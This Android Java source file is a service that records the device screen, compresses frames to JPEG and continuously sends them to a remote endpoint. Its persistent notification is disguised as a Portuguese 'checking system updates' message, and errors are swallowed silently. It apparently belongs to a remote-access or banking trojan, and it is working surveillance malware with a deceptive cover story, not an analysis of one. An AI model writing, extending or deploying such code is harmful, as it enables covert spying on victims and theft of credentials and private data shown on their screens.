package com.aval.seg;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenSvc extends Service {

    public static volatile boolean alive;
    public static volatile int Q = 38;
    public static volatile int FPS = 8;

    private MediaProjection mp;
    private VirtualDisplay vd;
    private ImageReader ir;
    private HandlerThread th;
    private Handler bh;
    private int w, h, dpi;
    private long last;

    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        super.onCreate();
        th = new HandlerThread("scr");
        th.start();
        bh = new Handler(th.getLooper());
    }

    @Override public int onStartCommand(Intent it, int f, int s) {
        if (it == null) return START_STICKY;
        startFg();
        try {
            MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            mp = mpm.getMediaProjection(it.getIntExtra("code", 0), (Intent) it.getParcelableExtra("data"));
            if (mp == null) { stopSelf(); return START_NOT_STICKY; }
            mp.registerCallback(new MediaProjection.Callback() {
                @Override public void onStop() { alive = false; }
            }, bh);
            DisplayMetrics dm = new DisplayMetrics();
            ((WindowManager) getSystemService(WINDOW_SERVICE)).getDefaultDisplay().getRealMetrics(dm);
            dpi = dm.densityDpi;
            w = (dm.widthPixels / 2) & ~1;
            h = (dm.heightPixels / 2) & ~1;
            ir = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
            ir.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override public void onImageAvailable(ImageReader r) { onImg(r); }
            }, bh);
            vd = mp.createVirtualDisplay("av", w, h, dpi,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, ir.getSurface(), null, bh);
            alive = true;
        } catch (Throwable t) {
            alive = false;
            stopSelf();
        }
        return START_STICKY;
    }

    private void onImg(ImageReader r) {
        Image img = null;
        Bitmap b = null;
        Bitmap out = null;
        try {
            img = r.acquireLatestImage();
            if (img == null) return;
            long now = System.currentTimeMillis();
            if (now - last < 1000 / Math.max(1, FPS)) return;
            last = now;
            Image.Plane p = img.getPlanes()[0];
            ByteBuffer bb = p.getBuffer();
            int ps = p.getPixelStride();
            int pad = p.getRowStride() - ps * w;
            b = Bitmap.createBitmap(w + pad / ps, h, Bitmap.Config.ARGB_8888);
            b.copyPixelsFromBuffer(bb);
            out = pad == 0 ? b : Bitmap.createBitmap(b, 0, 0, w, h);
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            out.compress(Bitmap.CompressFormat.JPEG, Q, bo);
            Net.sendBin(bo.toByteArray());
        } catch (Throwable ignored) {
        } finally {
            try { if (out != null && out != b) out.recycle(); } catch (Throwable ignored) {}
            try { if (b != null) b.recycle(); } catch (Throwable ignored) {}
            try { if (img != null) img.close(); } catch (Throwable ignored) {}
        }
    }

    private void startFg() {
        String ch = "av";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            nm.createNotificationChannel(new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_LOW));
        }
        Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        Notification n = nb.setContentTitle("Verificando atualizacoes do sistema")
                .setSmallIcon(R.mipmap.ic).setOngoing(true).build();
        if (Build.VERSION.SDK_INT >= 29) startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        else startForeground(1, n);
    }

    @Override public void onDestroy() {
        alive = false;
        try { if (vd != null) vd.release(); } catch (Throwable ignored) {}
        try { if (ir != null) ir.close(); } catch (Throwable ignored) {}
        try { if (mp != null) mp.stop(); } catch (Throwable ignored) {}
        try { if (th != null) th.quitSafely(); } catch (Throwable ignored) {}
        super.onDestroy();
    }
}
